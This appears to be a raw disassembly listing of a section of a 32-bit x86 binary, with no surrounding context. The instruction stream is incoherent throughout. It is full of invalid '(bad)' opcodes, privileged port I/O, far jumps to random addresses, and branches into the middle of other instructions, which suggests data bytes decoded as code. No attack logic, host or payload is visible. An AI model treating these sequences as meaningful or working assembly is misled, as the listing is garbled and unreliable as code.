  41a1d2:	mov    ch,0x40
  41a1d4:	add    eax,0x11a4aebd
  41a1d9:	into   
  41a1da:	pop    ebx
  41a1db:	mov    ah,0x80
  41a1dd:	outs   dx,DWORD PTR ds:[esi]
  41a1de:	adc    eax,0xd046dfc3
  41a1e3:	push   edi
  41a1e4:	inc    esp
  41a1e5:	xor    ecx,ebx
  41a1e7:	out    0x61,eax
  41a1e9:	jecxz  0x41a1db
  41a1eb:	or     DWORD PTR [ebx-0x6baab420],ecx
  41a1f1:	jmp    0xc7be38df
  41a1f6:	dec    eax
  41a1f7:	sti    
  41a1f8:	jle    0x41a218
  41a1fa:	or     dl,ah
  41a1fc:	scas   al,BYTE PTR es:[edi]
  41a1fd:	dec    ebx
  41a1fe:	and    eax,0x651eecbd
  41a203:	(bad)  
  41a204:	xchg   edx,eax
  41a205:	sti    
  41a206:	js     0x41a1ed
  41a208:	cs shr eax,1
  41a20b:	cs cmp eax,esp
  41a20e:	xlat   BYTE PTR ds:[ebx]
  41a20f:	inc    esi
  41a210:	jo     0x41a236
  41a212:	scas   al,BYTE PTR es:[edi]
  41a213:	fild   QWORD PTR [eax]
  41a215:	ja     0x41a25b
  41a217:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a218:	jns    0x41a1a7
  41a21a:	sbb    DWORD PTR [edx],esp
  41a21c:	rol    BYTE PTR gs:[ecx+0x4647723a],cl
  41a223:	jle    0x41a298
  41a225:	sub    DWORD PTR [edi+ebx*4+0x198be99c],edi
  41a22c:	pop    ss
  41a22d:	dec    ebx
  41a22e:	pushaw 
  41a230:	mov    esp,0x466654f3
  41a235:	xchg   edi,eax
  41a236:	stos   DWORD PTR es:[edi],eax
  41a237:	ja     0x41a1f5
  41a239:	ins    BYTE PTR es:[edi],dx
  41a23a:	inc    edi
  41a23b:	fisttp QWORD PTR [ecx+edi*2+0x4]
  41a23f:	xchg   bh,cl
  41a241:	cmp    ecx,DWORD PTR [edx]
  41a243:	push   0xb7d7906d
  41a248:	lea    ebp,[ebx+0x17]
  41a24b:	fs push eax
  41a24d:	cli    
  41a24e:	neg    BYTE PTR [edi+ebx*4+0x7]
  41a252:	xchg   edi,eax
  41a253:	or     edx,0x53
  41a256:	aas    
  41a257:	dec    ebp
  41a258:	cmp    bl,dh
  41a25a:	xchg   edx,eax
  41a25b:	dec    edx
  41a25c:	xchg   ebp,eax
  41a25d:	rcl    edi,0x44
  41a260:	cmp    al,0x48
  41a262:	jmp    DWORD PTR [edi]
  41a264:	gs es push ecx
  41a267:	sbb    DWORD PTR [edx+0x37],ebx
  41a26a:	(bad)  
  41a26b:	fsubr  DWORD PTR [edx]
  41a26d:	neg    BYTE PTR [esi+0x61]
  41a270:	pop    edi
  41a271:	push   cs
  41a272:	jecxz  0x41a247
  41a274:	xchg   esp,eax
  41a275:	pop    esi
  41a276:	jp     0x41a20f
  41a278:	out    dx,eax
  41a279:	xor    DWORD PTR [esi+0x60],esi
  41a27c:	pop    esp
  41a27d:	pop    edx
  41a27e:	retf   
  41a27f:	arpl   WORD PTR [eax-0xc],dx
  41a282:	into   
  41a283:	jno    0x41a247
  41a285:	aad    0x35
  41a287:	retf   0xdbe5
  41a28a:	lods   eax,DWORD PTR ds:[esi]
  41a28b:	enter  0x8f9c,0xc
  41a28f:	lds    eax,FWORD PTR [ebp+0x53144635]
  41a295:	mov    ecx,0xc8a8f46e
  41a29a:	push   ebp
  41a29b:	es fs pop ecx
  41a29e:	mov    cl,0x5a
  41a2a0:	aas    
  41a2a1:	jo     0x41a31c
  41a2a3:	inc    bl
  41a2a5:	dec    esi
  41a2a6:	dec    edi
  41a2a7:	out    dx,al
  41a2a8:	arpl   WORD PTR [edi],sp
  41a2aa:	(bad)  
  41a2ab:	or     ebp,DWORD PTR [edx]
  41a2ad:	inc    ecx
  41a2ae:	xor    esi,0xffffff9f
  41a2b1:	inc    ecx
  41a2b2:	add    ebp,edi
  41a2b4:	jle    0x41a2fe
  41a2b6:	add    esi,DWORD PTR ss:0x2b87d31b
  41a2bd:	cli    
  41a2be:	jae    0x41a26d
  41a2c0:	push   ss
  41a2c1:	pop    ds
  41a2c2:	(bad)
  41a2c6:	mov    dh,0x6
  41a2c8:	cdq    
  41a2c9:	xchg   edi,eax
  41a2ca:	push   es
  41a2cb:	inc    ecx
  41a2cc:	xlat   BYTE PTR ds:[ebx]
  41a2cd:	pop    edx
  41a2ce:	adc    eax,0x3364341e
  41a2d3:	popa   
  41a2d4:	mov    esp,0x19903e62
  41a2d9:	out    dx,al
  41a2da:	stos   DWORD PTR es:[edi],eax
  41a2db:	inc    eax
  41a2dc:	add    esp,DWORD PTR [ebx+0x68]
  41a2df:	sub    eax,0x356c8e
  41a2e4:	jg     0x41a2a9
  41a2e6:	daa    
  41a2e7:	fldenv [ecx-0x141329e9]
  41a2ed:	les    ebp,FWORD PTR [esi+esi*8]
  41a2f0:	inc    eax
  41a2f1:	jmp    0x1146:0xac407d82
  41a2f8:	cmc    
  41a2f9:	cmp    BYTE PTR ds:0xa9476919,0xad
  41a300:	enter  0x7f8d,0x4e
  41a304:	sub    bh,BYTE PTR [esi+0x69]
  41a307:	adc    esi,ebp
  41a309:	scas   eax,DWORD PTR es:[edi]
  41a30a:	jmp    0xe34e:0xcb52d706
  41a311:	test   BYTE PTR [ebx],ch
  41a313:	ins    DWORD PTR es:[edi],dx
  41a314:	jmp    0x8c180b32
  41a319:	sbb    al,0x25
  41a31b:	cmp    ebx,DWORD PTR [ebx]
  41a31d:	(bad)  
  41a31e:	sbb    al,0xe9
  41a320:	retf   
  41a321:	into   
  41a322:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a323:	push   esp
  41a324:	ret    
  41a325:	out    0xc3,eax
  41a327:	xor    eax,0xe737b062
  41a32c:	ss push esi
  41a32e:	loope  0x41a2d5
  41a330:	xlat   BYTE PTR ds:[ebx]
  41a331:	inc    ebx
  41a332:	push   es
  41a333:	call   0x1fb7:0x2bd0715f
  41a33a:	jo     0x41a301
  41a33c:	js     0x41a2fd
  41a33e:	xchg   ebx,eax
  41a33f:	shl    DWORD PTR [esi],0x9d
  41a342:	leave  
  41a343:	mov    dh,BYTE PTR [edi-0x3d]
  41a346:	inc    eax
  41a347:	sbb    ecx,esi
  41a349:	adc    DWORD PTR [edi],0xe
  41a34c:	sar    ah,cl
  41a34e:	xchg   edi,eax
  41a34f:	cld    
  41a350:	pop    ecx
  41a351:	pop    esp
  41a352:	xchg   edx,eax
  41a353:	mov    al,ds:0x55b2efb0
  41a358:	outs   dx,BYTE PTR ds:[esi]
  41a359:	jp     0x41a330
  41a35b:	xor    BYTE PTR [ecx],cl
  41a35d:	sub    bh,BYTE PTR [eax]
  41a35f:	out    0xdb,al
  41a361:	out    dx,al
  41a362:	mov    fs,WORD PTR [eax+0x15a916a9]
  41a368:	inc    edi
  41a369:	aad    0x52
  41a36b:	fcmovbe st,st(2)
  41a36d:	sbb    al,0x44
  41a36f:	jecxz  0x41a352
  41a371:	jge    0x41a31d
  41a373:	and    BYTE PTR [edx-0x41],dh
  41a376:	loop   0x41a3c6
  41a378:	dec    esi
  41a379:	xchg   DWORD PTR [ebp+0x7a],eax
  41a37c:	push   es
  41a37d:	into   
  41a37e:	(bad)  
  41a37f:	fs push esi
  41a381:	je     0x41a3bc
  41a383:	inc    ebx
  41a384:	ins    BYTE PTR es:[edi],dx
  41a385:	jl     0x41a3f0
  41a387:	push   es
  41a388:	dec    ecx
  41a389:	in     al,dx
  41a38a:	inc    esp
  41a38b:	stc    
  41a38c:	(bad)  
  41a38d:	sbb    DWORD PTR [ebx-0x78ebaccb],eax
  41a393:	mov    ecx,0xde09167c
  41a398:	or     DWORD PTR cs:[eax+0x5b12a767],0x48
  41a3a0:	sub    ax,0x8783
  41a3a4:	daa    
  41a3a5:	mov    cl,0xec
  41a3a7:	mov    ebx,0x127ffb2c
  41a3ac:	scas   al,BYTE PTR es:[edi]
  41a3ad:	adc    BYTE PTR [ecx+ebp*1-0x33],dl
  41a3b1:	frstpm(287 only) 
  41a3b3:	cmp    al,0x33
  41a3b5:	mov    dh,0x1c
  41a3b7:	int3   
  41a3b8:	pusha  
  41a3b9:	test   esi,ebp
  41a3bb:	sti    
  41a3bc:	ret    
  41a3bd:	mov    ecx,0x7ef358f
  41a3c2:	cmc    
  41a3c3:	fidivr DWORD PTR [ecx+0x10]
  41a3c6:	dec    esi
  41a3c7:	cld    
  41a3c8:	jo     0x41a3c4
  41a3ca:	mov    esi,0x5e31b0f8
  41a3cf:	xchg   edx,eax
  41a3d0:	scas   al,BYTE PTR es:[edi]
  41a3d1:	inc    ecx
  41a3d2:	out    dx,al
  41a3d3:	dec    ebp
  41a3d4:	jge    0x41a3fb
  41a3d6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a3d7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a3d8:	add    esi,DWORD PTR [edi-0x25758993]
  41a3de:	shl    esp,1
  41a3e0:	add    BYTE PTR [edi-0x755562c5],dl
  41a3e6:	xor    eax,0xeb3db44d
  41a3eb:	cmp    BYTE PTR [edi],ah
  41a3ed:	sbb    esi,0xffffff9f
  41a3f0:	xchg   BYTE PTR [ebx+eax*1-0x63c6fb1],ah
  41a3f7:	data16 jecxz 0x41a3c9
  41a3fa:	and    dl,BYTE PTR [ecx-0x78]
  41a3fd:	int    0x20
  41a3ff:	bound  edx,QWORD PTR [ecx+0x55]
  41a402:	push   ebp
  41a403:	enter  0x3f44,0x41
  41a407:	sub    DWORD PTR [ebx+0xde3951c],0xb
  41a40e:	dec    eax
  41a40f:	inc    edx
  41a410:	mov    bh,0xdf
  41a412:	leave  
  41a413:	pop    ss
  41a414:	nop
  41a415:	in     eax,0x68
  41a417:	push   ebx
  41a418:	mov    dh,0x33
  41a41a:	clc    
  41a41b:	add    BYTE PTR [ecx+0x161824a4],ch
  41a421:	and    al,0xd1
  41a423:	inc    ecx
  41a424:	mov    ah,0xe0
  41a426:	out    0x5,al
  41a428:	mov    esp,0xc9a5c95a
  41a42d:	xchg   si,ax
  41a42f:	cmp    eax,0x45d1e1d7
  41a434:	xor    DWORD PTR [edx],edi
  41a436:	xor    BYTE PTR [eax+0x54],dl
  41a439:	loop   0x41a444
  41a43b:	retf   0x5d4a
  41a43e:	in     eax,dx
  41a43f:	jmp    0x5b75b228
  41a444:	aas    
  41a445:	dec    ecx
  41a446:	or     DWORD PTR [ebx+0x5814eee9],ecx
  41a44c:	jno    0x41a475
  41a44e:	sbb    eax,0x74f5d0b5
  41a453:	ss ja  0x41a46b
  41a456:	(bad)
  41a45b:	les    esp,FWORD PTR [eax]
  41a45d:	outs   dx,DWORD PTR ds:[esi]
  41a45e:	sub    ecx,DWORD PTR [eax-0x36]
  41a461:	iret   
  41a462:	and    DWORD PTR [eax+ebx*2+0x61],ebp
  41a466:	ffree  st(3)
  41a468:	adc    edi,DWORD PTR [ebx-0x42]
  41a46b:	clc    
  41a46c:	push   ds
  41a46d:	mov    WORD PTR [ebp-0x54],fs
  41a470:	mov    cl,0xca
  41a472:	test   DWORD PTR [edi],edx
  41a474:	scas   eax,DWORD PTR es:[edi]
  41a475:	cmp    cl,BYTE PTR [edx+0x5a562131]
  41a47b:	addr16 retf 0x4669
  41a47f:	hlt    
  41a480:	call   0x42f6:0x6c89fe61
  41a487:	idiv   DWORD PTR [edx]
  41a489:	stos   BYTE PTR es:[edi],al
  41a48a:	xor    al,0x1a
  41a48c:	pop    esp
  41a48d:	ja     0x41a41c
  41a48f:	xor    ecx,DWORD PTR [esi-0x556c83cb]
  41a495:	std    
  41a496:	lock rcr DWORD PTR [eax-0x1771c33c],0x1c
  41a49e:	cmp    BYTE PTR [edx],dl
  41a4a0:	call   0x2d51:0x5b87b5d2
  41a4a7:	std    
  41a4a8:	adc    DWORD PTR [edi+0xe80933c],edx
  41a4ae:	and    al,0x53
  41a4b0:	xor    BYTE PTR [eax],cl
  41a4b2:	inc    edi
  41a4b3:	xchg   esi,eax
  41a4b4:	fs out 0x58,eax
  41a4b7:	jp     0x41a516
  41a4b9:	push   0x30bb0d77
  41a4be:	fs or  eax,0x2ea6d872
  41a4c4:	push   esp
  41a4c5:	add    DWORD PTR [esi-0x5742afd1],ebx
  41a4cb:	inc    eax
  41a4cc:	in     eax,dx
  41a4cd:	test   eax,0x74211a
  41a4d2:	or     eax,0xa43fde25
  41a4d7:	std    
  41a4d8:	jp     0x41a49b
  41a4da:	mov    al,0x1
  41a4dc:	leave  
  41a4dd:	into   
  41a4de:	imul   esi,edi,0xffffffb0
  41a4e1:	es push eax
  41a4e3:	sbb    DWORD PTR [ebx-0x11e51e48],ebx
  41a4e9:	jmp    0xe2ae01f0
  41a4ee:	pop    ss
  41a4ef:	adc    DWORD PTR [ebx+0x4f649346],edx
  41a4f5:	jnp    0x41a4af
  41a4f7:	pop    esp
  41a4f8:	jp     0x41a52e
  41a4fa:	or     al,0x28
  41a4fc:	sub    BYTE PTR [ebx+0x67],ch
  41a4ff:	mov    cl,0xb4
  41a501:	xor    ecx,esp
  41a503:	je     0x41a507
  41a505:	xor    eax,0xd2b26227
  41a50a:	cmc    
  41a50b:	jb     0x41a565
  41a50d:	jb     0x41a572
  41a50f:	ror    DWORD PTR [edi-0x758363b6],1
  41a515:	or     al,0x4a
  41a517:	in     al,0x99
  41a519:	pop    ss
  41a51a:	jbe    0x41a570
  41a51c:	into   
  41a51d:	jbe    0x41a4ab
  41a51f:	pop    esi
  41a520:	mov    esp,DWORD PTR [esp+edi*2-0x1c]
  41a524:	adc    BYTE PTR [ebx],al
  41a526:	ficom  WORD PTR [edx+0x536b6a3f]
  41a52c:	adc    DWORD PTR [ebp-0x27],0x2039d46c
  41a533:	lea    edx,[edx]
  41a535:	in     eax,dx
  41a536:	sti    
  41a537:	mov    BYTE PTR [ebp-0xb90d962],dh
  41a53d:	imul   esi,DWORD PTR [esi-0x2e3f423f],0xffffff82
  41a544:	test   eax,0xf287e47c
  41a549:	into   
  41a54a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a54b:	add    al,0xe7
  41a54d:	jnp    0x41a527
  41a54f:	jnp    0x41a4ef
  41a551:	and    cl,BYTE PTR [edx+edx*1-0x3c00ebdd]
  41a558:	push   edx
  41a559:	imul   eax,ebp,0x2b3327d1
  41a55f:	mov    ss,WORD PTR [ebp+0x1d]
  41a562:	scas   eax,DWORD PTR es:[edi]
  41a563:	dec    ebp
  41a564:	pop    ecx
  41a565:	je     0x41a5d8
  41a567:	dec    ebx
  41a568:	je     0x41a547
  41a56a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a56b:	adc    bh,BYTE PTR [edx+0x4607bf6c]
  41a571:	daa    
  41a572:	in     eax,0xae
  41a574:	mov    al,ds:0x9e2f9680
  41a579:	jne    0x41a5c0
  41a57b:	cs cmp esp,ebp
  41a57e:	sub    DWORD PTR [eax],eax
  41a580:	or     al,0x54
  41a582:	mov    ecx,0x52555329
  41a587:	es out 0x2,al
  41a58a:	jge    0x41a58d
  41a58c:	rcl    bl,0x8f
  41a58f:	fistp  QWORD PTR [edi]
  41a591:	add    ecx,DWORD PTR [ecx-0x12]
  41a594:	call   0xc992:0x8e61ec0d
  41a59b:	stc    
  41a59c:	dec    edx
  41a59d:	leave  
  41a59e:	rol    DWORD PTR [esp+ebx*8],cl
  41a5a1:	adc    eax,DWORD PTR [ecx-0x74]
  41a5a4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a5a5:	lods   al,BYTE PTR ds:[esi]
  41a5a6:	or     bh,BYTE PTR [edx-0x5c]
  41a5a9:	out    dx,eax
  41a5aa:	jmp    0xefec:0x985c3d4f
  41a5b1:	pop    ecx
  41a5b2:	sub    BYTE PTR [ebp+0x51],bh
  41a5b5:	and    BYTE PTR [edi+edi*2],0x6b
  41a5b9:	into   
  41a5ba:	and    dl,bl
  41a5bc:	aam    0x6f
  41a5be:	xchg   ebp,eax
  41a5bf:	jnp    0x41a5cf
  41a5c1:	fstp   TBYTE PTR [edi+0x6c]
  41a5c4:	and    BYTE PTR [ebx],dl
  41a5c6:	push   eax
  41a5c7:	cmp    ebp,edx
  41a5c9:	ret    
  41a5ca:	repz std 
  41a5cc:	xor    ecx,edi
  41a5ce:	(bad)  
  41a5cf:	mov    ebx,0x409907f8
  41a5d4:	and    ch,BYTE PTR [edi+0x7f]
  41a5d7:	sub    ebp,DWORD PTR [ecx-0x129bc48c]
  41a5dd:	js     0x41a64f
  41a5df:	lods   al,BYTE PTR ds:[esi]
  41a5e0:	nop
  41a5e1:	adc    esi,0xcaf5bc71
  41a5e7:	in     al,dx
  41a5e8:	mov    edi,0x6d61fc2e
  41a5ed:	fcom   DWORD PTR [ecx+ecx*1]
  41a5f0:	fcom   st(2)
  41a5f2:	iret   
  41a5f3:	push   eax
  41a5f4:	push   0x43
  41a5f6:	and    BYTE PTR [ebp+0x6],bh
  41a5f9:	push   0xffe7c5be
  41a5fe:	adc    eax,0xa3def598
  41a603:	stos   BYTE PTR es:[edi],al
  41a604:	xchg   edi,eax
  41a605:	and    al,0x8f
  41a607:	mov    DWORD PTR [eax],ebx
  41a609:	ins    BYTE PTR es:[edi],dx
  41a60a:	mov    al,0xbc
  41a60c:	pop    ecx
  41a60d:	ds dec ebp
  41a60f:	dec    esp
  41a610:	inc    eax
  41a611:	lahf   
  41a612:	fsub   QWORD PTR [eax-0x2c1dd411]
  41a618:	call   0xf39d8a26
  41a61d:	es xchg edi,eax
  41a61f:	das    
  41a620:	adc    eax,0x1397602a
  41a625:	fisttp QWORD PTR [edx+0x4d]
  41a628:	lds    esi,FWORD PTR [ecx-0xf]
  41a62b:	xor    bl,al
  41a62d:	xlat   BYTE PTR ds:[ebx]
  41a62e:	sub    BYTE PTR [ebx-0x10],cl
  41a631:	and    al,0x54
  41a633:	(bad)  
  41a634:	mov    ch,0xe4
  41a636:	in     eax,0xca
  41a638:	or     al,0x51
  41a63a:	ds ins BYTE PTR es:[edi],dx
  41a63c:	out    dx,al
  41a63d:	pop    ecx
  41a63e:	and    esp,DWORD PTR [eax+0x5a21b46d]
  41a644:	adc    eax,0x8c54422b
  41a649:	push   ebp
  41a64a:	pop    esp
  41a64b:	pop    ebx
  41a64c:	sbb    al,0xb3
  41a64e:	or     ebx,DWORD PTR [esi]
  41a650:	aaa    
  41a651:	imul   esi,edx,0x72f45813
  41a657:	mov    WORD PTR [esi+edi*2],fs
  41a65a:	aam    0x73
  41a65c:	sbb    ch,BYTE PTR ds:0xff66375e
  41a662:	jl     0x41a67e
  41a664:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a665:	inc    ebp
  41a666:	(bad)  
  41a667:	inc    ebp
  41a668:	add    DWORD PTR [esi+0x311257c1],0x68
  41a66f:	mov    BYTE PTR [edi-0x76],ah
  41a672:	add    bh,BYTE PTR [esi-0x7142aec7]
  41a678:	lds    esp,FWORD PTR [eax]
  41a67a:	sub    dl,dl
  41a67c:	adc    DWORD PTR [eax],eax
  41a67e:	mov    esi,gs
  41a680:	daa    
  41a681:	shl    ecx,1
  41a683:	sbb    bh,BYTE PTR [esi]
  41a685:	mov    eax,ds:0x2d42e9da
  41a68a:	push   ebx
  41a68b:	xchg   ebp,eax
  41a68c:	push   0x7d
  41a68e:	mov    gs,esi
  41a690:	xor    ebx,DWORD PTR [esp+ebx*4-0x54645217]
  41a697:	lahf   
  41a698:	aaa    
  41a699:	(bad)  
  41a69a:	xlat   BYTE PTR ds:[ebx]
  41a69b:	sahf   
  41a69c:	cmp    BYTE PTR [ecx+0x6b],bh
  41a69f:	inc    esi
  41a6a0:	mov    edx,0xe32c52ef
  41a6a5:	or     BYTE PTR [edi-0x6c6f98dd],ah
  41a6ab:	mov    WORD PTR [esi+0x13],ds
  41a6ae:	push   ebx
  41a6af:	pop    ebx
  41a6b0:	push   ebx
  41a6b1:	mov    al,ds:0x5b2af00
  41a6b6:	(bad)  
  41a6b7:	inc    edi
  41a6b8:	js     0x41a6bb
  41a6ba:	ins    BYTE PTR es:[edi],dx
  41a6bb:	std    
  41a6bc:	mov    eax,ds:0x408b711d
  41a6c1:	into   
  41a6c2:	mov    ds:0x210e994,eax
  41a6c7:	jns    0x41a655
  41a6c9:	mov    bl,0x85
  41a6cb:	stos   DWORD PTR es:[edi],eax
  41a6cc:	xor    al,0x76
  41a6ce:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a6cf:	pop    esi
  41a6d0:	push   es
  41a6d1:	sbb    DWORD PTR [esi+0x20],0x18d5f18b
  41a6d8:	bound  ecx,QWORD PTR [ecx]
  41a6da:	add    DWORD PTR cs:[esp+ebx*2+0x7b],ebx
  41a6df:	add    dl,bh
  41a6e1:	dec    edx
  41a6e2:	stc    
  41a6e3:	fcom   QWORD PTR [esi-0x28]
  41a6e6:	out    0x86,al
  41a6e8:	popa   
  41a6e9:	fild   QWORD PTR [edi+0x3a]
  41a6ec:	push   esp
  41a6ed:	lea    esp,[eax]
  41a6ef:	sbb    BYTE PTR [eax+0x2512ec41],ch
  41a6f5:	and    dl,BYTE PTR [eax]
  41a6f7:	hlt    
  41a6f8:	js     0x41a74e
  41a6fa:	neg    bh
  41a6fc:	leave  
  41a6fd:	dec    edx
  41a6fe:	inc    eax
  41a6ff:	or     al,BYTE PTR [edx-0x4b]
  41a702:	out    0xf2,eax
  41a704:	mov    ebx,0xfb91baaa
  41a709:	in     eax,dx
  41a70a:	and    ebp,DWORD PTR [eax-0x5c]
  41a70d:	in     eax,dx
  41a70e:	in     al,0xf2
  41a710:	cs call 0x2e1c6967
  41a716:	pop    ds
  41a717:	ds push ebx
  41a719:	in     al,dx
  41a71a:	mov    BYTE PTR [esi],al
  41a71c:	inc    ebp
  41a71d:	sub    ebx,DWORD PTR [edi]
  41a71f:	rcr    DWORD PTR [edx],cl
  41a721:	xchg   BYTE PTR [edx+0x233ab2a7],ch
  41a727:	add    BYTE PTR [ecx-0x5dc5babf],ah
  41a72d:	les    esp,FWORD PTR [edi]
  41a72f:	call   0xb9c9cb59
  41a734:	or     esi,esi
  41a736:	pop    edi
  41a737:	pop    esp
  41a738:	outs   dx,DWORD PTR ds:[esi]
  41a739:	out    dx,eax
  41a73a:	dec    eax
  41a73b:	or     esi,DWORD PTR fs:[ebp+0x31990c45]
  41a742:	or     ch,0xf2
  41a745:	js     0x41a7a3
  41a747:	xchg   ecx,eax
  41a748:	jecxz  0x41a77a
  41a74a:	mov    al,ds:0x81528b81
  41a74f:	aad    0x9b
  41a751:	adc    ah,BYTE PTR [ecx]
  41a753:	fistp  WORD PTR [edx-0x4f]
  41a756:	inc    edi
  41a757:	fild   WORD PTR ds:[edx]
  41a75a:	jne    0x41a717
  41a75c:	fcmovb st,st(4)
  41a75e:	int    0x7
  41a760:	std    
  41a761:	inc    BYTE PTR [ebp+0x5b82e4c]
  41a767:	pushf  
  41a768:	pusha  
  41a769:	dec    ebp
  41a76a:	push   ds
  41a76b:	cmp    DWORD PTR [edx+0x16d62fad],edi
  41a771:	or     dl,dl
  41a773:	cdq    
  41a774:	xor    eax,0x255b48d8
  41a779:	add    DWORD PTR [esi+0x4bb66dd9],ecx
  41a77f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a780:	(bad)  
  41a782:	lds    edi,FWORD PTR ds:0xb025ac6c
  41a788:	test   al,0x25
  41a78a:	shl    BYTE PTR [ebp+eax*2-0x5a0ba50c],1
  41a791:	inc    edx
  41a792:	push   ebp
  41a793:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a794:	xchg   ebp,eax
  41a795:	js     0x41a78a
  41a797:	sub    edx,DWORD PTR [esi+0x234dca52]
  41a79d:	neg    DWORD PTR [eax]
  41a79f:	aad    0xff
  41a7a1:	xor    al,0x52
  41a7a3:	aam    0xd8
  41a7a5:	jl     0x41a805
  41a7a7:	push   edi
  41a7a8:	stos   DWORD PTR es:[edi],eax
  41a7a9:	add    eax,0x95941def
  41a7ae:	sub    ebx,edi
  41a7b0:	int    0xf5
  41a7b2:	dec    esi
  41a7b3:	xchg   edi,eax
  41a7b4:	jp     0x41a829
  41a7b6:	inc    edi
  41a7b7:	cmp    ch,al
  41a7b9:	mov    bh,0x4a
  41a7bb:	sbb    BYTE PTR [ebp+ecx*2+0x7659741c],bh
  41a7c2:	(bad)  
  41a7c5:	outs   dx,DWORD PTR ds:[esi]
  41a7c6:	or     edi,DWORD PTR [eax+0x6]
  41a7c9:	pop    edx
  41a7ca:	jne    0x41a7ac
  41a7cc:	mov    edx,DWORD PTR [ebx+0x2a]
  41a7cf:	mov    ebx,0xd55aaf02
  41a7d4:	mov    WORD PTR [ebp+0x77],cs
  41a7d7:	jne    0x41a854
  41a7d9:	dec    ecx
  41a7da:	push   esp
  41a7db:	add    eax,0x33ac6aaa
  41a7e0:	out    0x16,eax
  41a7e2:	pop    es
  41a7e3:	mov    ebp,0x6c06ad38
  41a7e8:	mov    es,WORD PTR [esi]
  41a7ea:	lods   eax,DWORD PTR ds:[esi]
  41a7eb:	pushf  
  41a7ec:	pop    edx
  41a7ed:	sbb    BYTE PTR [eax+0x4],ah
  41a7f0:	xor    DWORD PTR [eax],esi
  41a7f2:	mov    ebp,ebp
  41a7f4:	jle    0x41a77b
  41a7f6:	inc    edx
  41a7f7:	shl    BYTE PTR [ebx+0xc],0x6
  41a7fb:	or     ebp,ecx
  41a7fd:	sub    eax,DWORD PTR [edx+0x3b22fa92]
  41a803:	mov    ds:0x60fd2e46,eax
  41a808:	cmp    eax,0x2f1a1de0
  41a80d:	mov    ch,0x91
  41a80f:	add    al,0x1f
  41a811:	in     al,0xe8
  41a813:	cmp    cl,dl
  41a815:	ss fld st(7)
  41a818:	inc    ecx
  41a819:	dec    bx
  41a81b:	aad    0x50
  41a81d:	push   ss
  41a81e:	adc    dh,bl
  41a820:	pop    esp
  41a821:	cs pop edi
  41a823:	mov    edi,0x144d3b56
  41a828:	jl     0x41a7af
  41a82a:	inc    ebp
  41a82b:	jmp    0x979a33ce
  41a830:	xchg   ecx,eax
  41a831:	loopne 0x41a87d
  41a833:	cli    
  41a834:	push   0x68
  41a836:	test   dh,dh
  41a838:	inc    edx
  41a839:	ins    BYTE PTR es:[edi],dx
  41a83a:	sbb    al,BYTE PTR [ecx+0x2c]
  41a83d:	jnp    0x41a8b4
  41a83f:	cmp    DWORD PTR [edi-0x7d1c33b7],edx
  41a845:	and    BYTE PTR [esi+ecx*8],dh
  41a848:	add    eax,0xa0724231
  41a84d:	lahf   
  41a84e:	out    0x5e,eax
  41a850:	js     0x41a88f
  41a852:	and    eax,DWORD PTR [esi-0x36253b24]
  41a858:	dec    ebx
  41a859:	push   ebp
  41a85a:	inc    DWORD PTR [ecx+0x71ee20e]
  41a860:	es sbb al,0x2
  41a863:	cmp    al,0x5a
  41a865:	push   esp
  41a866:	rdmsr  
  41a868:	adc    esi,ebp
  41a86a:	fwait
  41a86b:	pushf  
  41a86c:	dec    edi
  41a86d:	mov    ch,0x48
  41a86f:	daa    
  41a870:	add    al,0xba
  41a872:	mov    ecx,0xd25165b1
  41a877:	xchg   DWORD PTR [edi+0x71],esp
  41a87a:	cld    
  41a87b:	mov    ds:0xabe63bb0,al
  41a880:	outs   dx,BYTE PTR ds:[esi]
  41a881:	lds    esp,FWORD PTR [edx-0x463b0ae1]
  41a887:	les    eax,FWORD PTR ds:0x1501
  41a88c:	mov    eax,ds:0x80c6bd71
  41a891:	out    0xd0,eax
  41a893:	jo     0x41a81a
  41a895:	mov    dh,0x17
  41a897:	imul   edx,DWORD PTR ds:0xa75c06b0,0xd0343734
  41a8a1:	mov    eax,0x27b0e348
  41a8a6:	push   esp
  41a8a7:	cwde   
  41a8a8:	mov    edx,0x6a530ca7
  41a8ad:	shr    BYTE PTR [esi+0x1850504b],1
  41a8b3:	das    
  41a8b4:	inc    ecx
  41a8b5:	sbb    ah,BYTE PTR [edi+0x762ed648]
  41a8bb:	push   cs
  41a8bc:	mov    edx,0x4bc0d3c5
  41a8c1:	jae    0x41a8a9
  41a8c3:	cwde   
  41a8c4:	xor    BYTE PTR [eax],0xa8
  41a8c7:	test   eax,0xa29664e5
  41a8cc:	stos   DWORD PTR es:[edi],eax
  41a8cd:	data16 cmc 
  41a8cf:	mov    dl,BYTE PTR [edx]
  41a8d1:	shl    BYTE PTR [ecx],1
  41a8d3:	fwait
  41a8d4:	in     al,0x1
  41a8d6:	in     eax,dx
  41a8d7:	les    esi,FWORD PTR [esi+0x42]
  41a8da:	sub    ah,al
  41a8dc:	add    al,0x3e
  41a8de:	out    dx,al
  41a8df:	std    
  41a8e0:	call   0x152fa5fc
  41a8e5:	nop
  41a8e6:	outs   dx,DWORD PTR ds:[esi]
  41a8e7:	out    0x87,eax
  41a8e9:	std    
  41a8ea:	shr    BYTE PTR [edx-0x3f],1
  41a8ed:	dec    eax
  41a8ee:	mov    ds:0x72b2c4ed,al
  41a8f3:	add    eax,0xbc99011e
  41a8f8:	add    edi,edi
  41a8fa:	out    dx,eax
  41a8fb:	mov    al,ds:0xb19531a1
  41a900:	cdq    
  41a901:	sbb    ecx,ecx
  41a903:	jmp    0xf7d2:0x38ba6803
  41a90a:	rcl    BYTE PTR [ebx-0x17],0x1b
  41a90e:	mov    dh,0xbf
  41a910:	jmp    0x41a89d
  41a912:	jno    0x41a8df
  41a914:	lock fmul DWORD PTR [ebx]
  41a917:	aas    
  41a918:	sti    
  41a919:	outs   dx,DWORD PTR ds:[esi]
  41a91a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a91b:	push   0xffffffc7
  41a91d:	mov    ebx,0x9a506c63
  41a922:	leave  
